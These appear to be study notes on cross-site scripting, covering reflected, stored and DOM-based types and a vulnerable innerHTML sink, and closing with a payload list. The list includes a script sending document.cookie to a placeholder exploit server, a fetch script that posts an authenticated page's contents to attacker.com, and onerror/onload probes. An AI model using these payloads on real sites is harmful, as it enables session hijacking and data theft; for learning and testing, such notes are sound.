Reflected cross-site scripting:
Malicious script comes from the current HTTP request

Stored cross-site scripting:
Malicious script comes from the website's database

DOM-based cross-site scripting:
The vulnerability exists in client-side code rather than server-side code
var search = document.getElementById('search').value;
var results = document.getElementById('results');
results.innerHTML = 'You searched for: ' + search;
You searched for: <img src=1 onerror='/* Bad stuff here... */'>

To find DOM-based vulnerabilities in non-URL-based input (such as document.cookie) or non-HTML-based sinks (like setTimeout), there is no substitute for reviewing JavaScript code

eval() or innerHTML --> enables attackers to execute malicious JavaScript

DOM Invader --> Burp's built-in browser

Example:
alert()
alert(document.domain)
alert(document.cookie)
print()
<script>document.location='//YOUR-EXPLOIT-SERVER-ID.exploit-server.net/'+document.cookie</script>

"</script><script>
        fetch("https://targetURL.com", {
                  credentials: 'include'
        })
        .then(async (response) => {
                if(response.status != 401){
                        let data = await response.text();
                        let encodedData = btoa(unescape(encodeURIComponent(data)));
                        fetch("https://www.attacker.com", {
                                method: 'POST',
                                headers: {
                                          'Content-Type': 'application/json'
                                },
                                body: JSON.stringify({
                                        msg: encodeData
                                })
                        })
                }
          })
</script>

<img src=x onerror=alert("message")>
<img src=x onerror=prompt(1)>
;</script><svg onload=alert("message")>
